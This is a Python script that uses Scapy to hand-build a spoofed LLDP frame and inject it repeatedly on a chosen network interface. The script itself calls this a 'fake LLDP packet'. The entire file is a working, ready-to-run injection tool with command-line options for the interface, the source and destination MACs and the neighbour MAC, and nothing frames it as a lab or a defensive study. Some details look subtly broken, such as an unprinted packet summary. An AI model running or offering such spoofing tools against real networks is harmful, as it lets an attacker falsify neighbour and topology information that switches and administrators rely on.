#! /usr/bin/env python

import os
import sys
import time
import argparse
from scapy.all import (
    Ether,
    sendp,
    conf,
    Raw,
)


def build_lldp_packet(src_mac, dst_mac, neighbor_mac):
    """Builds an LLDP packet."""

    # Chassis ID TLV (Type 1, Length, Chassis ID)
    chassis_id_type = 7  # Locally assigned
    chassis_id = src_mac  # Use the source MAC as the chassis ID
    chassis_id_tlv = bytes([1, len(chassis_id) + 1, chassis_id_type]) + chassis_id.encode()

    # Port ID TLV (Type 2, Length, Port ID)
    port_id_type = 5  # Interface name
    port_id = "eth0"  # Or whatever interface you want to associate with the port
    port_id_tlv = bytes([2, len(port_id) + 1, port_id_type]) + port_id.encode()

    # TTL TLV (Type 3, Length, TTL)
    ttl = 120  # Time to live in seconds
    ttl_tlv = bytes([3, 2]) + ttl.to_bytes(2, 'big')

    # Port Description TLV (Type 4, Length, Description)
    port_descr = f"Direct Link to {neighbor_mac}"
    port_descr_tlv = bytes([4, len(port_descr)]) + port_descr.encode()

    # System Name TLV (Type 5, Length, System Name)
    system_name = "MySystem"
    system_name_tlv = bytes([5, len(system_name)]) + system_name.encode()

    # System Capabilities TLV (Type 6, Length, Capabilities)
    system_cap_tlv = bytes([6, 4, 0b00000100, 0b00000000])  # Bridge capability

    # Management Address TLV (Type 8, Length, Address Info)
    # Omitted for simplicity

    # End of LLDPDU TLV (Type 0, Length 0)
    end_of_lldpdu_tlv = bytes([0, 0])

    # Construct the LLDPDU by concatenating TLVs
    lldpdu = chassis_id_tlv + port_id_tlv + ttl_tlv + port_descr_tlv + system_name_tlv + system_cap_tlv + end_of_lldpdu_tlv

    # Ethernet frame
    ether = Ether(src=src_mac, dst=dst_mac, type=0x88cc)

    # Construct the complete packet
    packet = ether / Raw(load=lldpdu)
    return packet


def main(interface, src_mac, dst_mac, neighbor_mac):
    """Main function to send the fake LLDP packet."""

    # Build the fake LLDP packet
    packet = build_lldp_packet(src_mac, dst_mac, neighbor_mac)

    # Print packet summary
    print("Summary of the crafted packet:")
    packet.summary()

    # Send the packet
    print(f"Sending fake LLDP packet on interface {interface}...")
    try:
        sendp(packet, iface=interface, verbose=1, count=3)
        print("LLDP packet injected.")
    except OSError as e:
        print(f"Error sending packet: {e}")
        print("Make sure the interface is correct and you have sufficient permissions (e.g., run as root).")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject a fake LLDP packet.")
    parser.add_argument("--interface", required=True, help="Network interface (e.g., eth0)")
    parser.add_argument("--src_mac", required=True, help="Source MAC address")
    parser.add_argument("--dst_mac", required=True, help="Destination MAC address")
    parser.add_argument("--neighbor_mac", required=True, help="Neighbor MAC address")

    args = parser.parse_args()

    interface = args.interface
    src_mac = args.src_mac
    dst_mac = args.dst_mac
    neighbor_mac = args.neighbor_mac

    main(interface, src_mac, dst_mac, neighbor_mac)